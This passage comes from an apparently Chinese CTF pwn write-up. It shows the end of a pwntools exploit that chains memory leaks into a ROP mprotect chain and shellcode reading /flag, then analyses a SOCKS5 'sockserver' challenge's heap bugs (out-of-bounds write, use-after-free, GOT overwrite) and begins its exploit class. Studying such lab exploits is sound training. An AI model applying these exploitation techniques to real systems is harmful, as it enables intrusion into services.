*$rebase(0x1FB50)")</span><br><br><span style="color:#DBD7CAEE">shop</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 10</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">shop</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">10</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*0x</span><span style="color:#4C9A91">40</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">heap_leak </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">3f8</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 7</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">des </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">x</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*</span><span style="color:#4C9A91">10</span><br><span style="color:#DBD7CAEE">leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> inv</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">,</span><span style="color:#BD976A"> des</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">des</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># leak_info("leak", leak)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*0x</span><span style="color:#4C9A91">40</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">heap_leak </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">440</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">des </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">''</span><br><span style="color:#DBD7CAEE">code_leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> inv</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">,</span><span style="color:#BD976A"> des</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">des</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">leak_info</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">code_leak</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> code_leak</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">code_base </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> code_leak </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">367b8</span><br><span style="color:#DBD7CAEE">leak_info</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">code_base</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> code_base</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*0x</span><span style="color:#4C9A91">40</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">code_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">372a8</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">des </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">libc_leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> inv</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">,</span><span style="color:#BD976A"> des</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">des</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">leak_info</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">libc_leak</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> libc_leak</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*0x</span><span style="color:#4C9A91">40</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">libc_leak </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">1dd0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">des </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">stderr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> inv</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">,</span><span style="color:#BD976A"> des</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">des</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">leak_info</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">stderr</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stderr</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> stderr </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">21b6a0</span><br><span style="color:#DBD7CAEE">leak_info</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">libc.address</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*0x</span><span style="color:#4C9A91">40</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">heap_leak </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">64e0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">des </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">stack_leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> inv</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">,</span><span style="color:#BD976A"> des</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">des</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">leak_info</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">stack_leak</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stack_leak</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># debug("b *$rebase(0x2A8E4)")</span><br><span style="color:#758575DD"># map()</span><br><br><span style="color:#DBD7CAEE">pop_rdi </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">2a3e5</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address</span><br><span style="color:#DBD7CAEE">pop_rsi </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">1518c2</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address</span><br><span style="color:#DBD7CAEE">pop_rdx_2 </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">904a9</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address</span><br><span style="color:#DBD7CAEE">pop_rax </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">45eb0</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address</span><br><span style="color:#DBD7CAEE">syscall </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">91316</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address</span><br><span style="color:#DBD7CAEE">pop_rcx </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">3d1ee</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address</span><br><span style="color:#DBD7CAEE">pop_rsp </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">35732</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address</span><br><span style="color:#DBD7CAEE">add_rsp_820 </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">149878</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address</span><br><span style="color:#DBD7CAEE">xor_eax </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">404f8</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address</span><br><span style="color:#DBD7CAEE">xor_edi_syscall </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">d9c4c</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address</span><br><span style="color:#DBD7CAEE">xor_edx_eax </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">a8558</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address</span><br><br><span style="color:#DBD7CAEE">new_rop </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> stack_leak </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">de0</span><br><br><span style="color:#DBD7CAEE">rop_chain </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><br><span style="color:#DBD7CAEE">    xor_eax</span><span style="color:#666666">,</span><br><span style="color:#DBD7CAEE">    pop_rsi</span><span style="color:#666666">,</span><br><span style="color:#DBD7CAEE">    stack_leak</span><span style="color:#CB7676">-0x</span><span style="color:#4C9A91">da8</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><br><span style="color:#DBD7CAEE">    xor_edx_eax</span><span style="color:#666666">,</span><br><span style="color:#DBD7CAEE">    pop_rdx_2</span><span style="color:#666666">,</span><br><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">1011</span><span style="color:#666666">,</span><br><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">1011</span><span style="color:#666666">,</span><br><span style="color:#DBD7CAEE">    xor_edi_syscall</span><br><span style="color:#5eaab5">]</span><br><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> gadget </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> enumerate</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">rop_chain</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*0x</span><span style="color:#4C9A91">40</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">new_rop </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> i</span><span style="color:#CB7676">*</span><span style="color:#4C9A91">8</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    des </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">gadget</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    inv</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">,</span><span style="color:#BD976A"> des</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">des</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">rop_start </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> stack_leak </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">1620</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*0x</span><span style="color:#4C9A91">40</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">rop_start</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">des </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">add_rsp_820</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># debug("b *$rebase(0xBA84)")</span><br><span style="color:#DBD7CAEE">inv</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">,</span><span style="color:#BD976A"> des</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">des</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">final_rop </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pop_rax</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">10</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">final_rop </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pop_rdi</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stack_leak </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">d48</span><span style="color:#4d9375">)</span><span style="color:#CB7676">&#x26;0x</span><span style="color:#4C9A91">fffffffffffff000</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">final_rop </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pop_rsi</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">1000</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">final_rop </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pop_rdx_2</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">7</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">*</span><span style="color:#4C9A91">2</span><br><span style="color:#DBD7CAEE">final_rop </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">syscall</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">stack_leak </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">d48</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">final_rop </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">open</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/flag</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">final_rop </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">read</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stack_leak</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">40</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">final_rop </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">write</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stack_leak</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">40</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">final_rop</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="sockserver" class="scroll-target"><a href="#sockserver"><code class="hash inline-code">#</code>sockserver</a></h2>
<p>出题人给了一个 webserver.py，一个 socket5 server，socket5 server里面自定义了一个菜单堆。</p>
<p>出题人给的 dockerfile 需要稍微改一下：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-Dockerfile language-dockerfile"><span style="color:#A0ADA0"># 把原先的 COPY ./bin/ /home/ctf/ 替换成下面的</span><br><span style="color:#1E754F">COPY</span><span style="color:#393A34"> ./sockserver /home/ctf/</span><br><span style="color:#1E754F">COPY</span><span style="color:#393A34"> ./webserver.py /home/ctf/</span><br><span style="color:#1E754F">RUN</span><span style="color:#393A34"> mkdir /home/ctf/web</span><br><span style="color:#1E754F">COPY</span><span style="color:#393A34"> ./web/index.html /home/ctf/web/</span><br><span style="color:#1E754F">COPY</span><span style="color:#393A34"> ./flag /home/ctf/</span><br><span style="color:#1E754F">COPY</span><span style="color:#393A34"> ./monitor.sh /home/ctf/</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-Dockerfile language-dockerfile"><span style="color:#758575DD"># 把原先的 COPY ./bin/ /home/ctf/ 替换成下面的</span><br><span style="color:#4D9375">COPY</span><span style="color:#DBD7CAEE"> ./sockserver /home/ctf/</span><br><span style="color:#4D9375">COPY</span><span style="color:#DBD7CAEE"> ./webserver.py /home/ctf/</span><br><span style="color:#4D9375">RUN</span><span style="color:#DBD7CAEE"> mkdir /home/ctf/web</span><br><span style="color:#4D9375">COPY</span><span style="color:#DBD7CAEE"> ./web/index.html /home/ctf/web/</span><br><span style="color:#4D9375">COPY</span><span style="color:#DBD7CAEE"> ./flag /home/ctf/</span><br><span style="color:#4D9375">COPY</span><span style="color:#DBD7CAEE"> ./monitor.sh /home/ctf/</span><br></code></pre></div>
<p>洞主要就是以下几个：</p>
<ol>
<li><code class="inline-code">delete</code> 函数里直接对 <code class="inline-code">msg_cnt</code> 减一，这就有可能导致 <code class="inline-code">msg_cnt != cur_idx</code>，按理说这俩应该是保持一致的，而 add 函数里又只对 <code class="inline-code">msg_cnt</code> 做了检测，所以理论上可以做到无限申请 + 数组越界</li>
<li>功能 5 提供了一个 sock 连接的能力，预期如果可以打个 ssrf 什么的直接看 /flag.html 就好了，但是得先创建这个文件，web 目录下只有 index.html</li>
<li>功能 6 <code class="inline-code">clear_all</code> 函数会把 <code class="inline-code">msg</code> 结构体 reset，但是不会重构指针，可以做 uaf</li>
<li>错误的，多线程不能打堆，不在一个 <code class="inline-code">tps</code>，花了三个小时写的 poc 贴上面了，血的教训</li>
<li>功能 5 的 <code class="inline-code">Strcmp</code> 可以用来侧信道 leak</li>
<li>main <code class="inline-code">msgbox</code> `数组越界写，可以改 got</li>
</ol>
<p>这是最终封装的 exp：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> time</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> threading</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> socket</span><br><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">info</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">arch </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">amd64</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">os </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">linux</span><span style="color:#B5695977">'</span><br><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">class</span><span style="color:#2E8F82"> SOCK5Pwn</span><span style="color:#999999">:</span><br><span style="color:#AB5959">    def</span><span style="color:#998418"> __init__</span><span style="color:#2993a3">(</span><span style="color:#393A34">self</span><span style="color:#999999">,</span><span style="color:#393A34"> host</span><span style="color:#AB5959">=</span><span style="color:#B5695977">"</span><span style="color:#B56959">127.0.0.1</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> port</span><span style="color:#AB5959">=</span><span style="color:#2F798A">1080</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">host </span><span style="color:#999999">=</span><span style="color:#393A34"> host</span><br><span style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">port </span><span style="color:#999999">=</span><span style="color:#393A34"> port</span><br><span style="color:#1E754F">        try</span><span style="color:#999999">:</span><br><span style="color:#A65E2B">            self</span><span style="color:#999999">.</span><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#A65E2B">self</span><span style="color:#999999">.</span><span style="color:#393A34">host</span><span style="color:#999999">,</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">port</span><span style="color:#999999">,</span><span style="color:#B07D48"> timeout</span><span style="color:#999999">=</span><span style="color:#2F798A">10</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        except</span><span style="color:#998418"> Exception</span><span style="color:#1E754F"> as</span><span style="color:#393A34"> e</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            while</span><span style="color:#1E754F"> True</span><span style="color:#999999">:</span><br><span style="color:#393A34">                info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Reconnecting due to error: </span><span style="color:#1e754f">{</span><span style="color:#393A34">e</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#A65E2B">                self</span><span style="color:#999999">.</span><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#A65E2B">self</span><span style="color:#999999">.</span><span style="color:#393A34">host</span><span style="color:#999999">,</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">port</span><span style="color:#999999">,</span><span style="color:#B07D48"> timeout</span><span style="color:#999999">=</span><span style="color:#2F798A">10</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">                if</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">:</span><br><span style="color:#1E754F">                    break</span><br><span style="color:#1E754F">            pass</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">self</span><span style="color:#999999">,</span><span style="color:#393A34"> method</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        request </span><span style="color:#999999">=</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#393A34">method</span><span style="color:#2993a3">)</span><br><span style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">request</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        response </span><span style="color:#999999">=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">response</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 2</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            return</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><br><span style="color:#393A34">        ver</span><span style="color:#999999">,</span><span style="color:#393A34"> selected </span><span style="color:#999999">=</span><span style="color:#393A34"> response</span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#2993a3">]</span><span style="color:#999999">,</span><span style="color:#393A34"> response</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> ver </span><span style="color:#AB5959">!=</span><span style="color:#2F798A"> 5</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            return</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> selected</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> _add</span><span style="color:#2993a3">(</span><span style="color:#393A34">self</span><span style="color:#999999">,</span><span style="color:#393A34"> msg</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        res </span><span style="color:#999999">=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> res </span><span style="color:#AB5959">!=</span><span style="color:#2F798A"> 3</span><span style="color:#999999">:</span><span style="color:#1E754F"> return</span><span style="color:#1E754F"> None</span><br><span 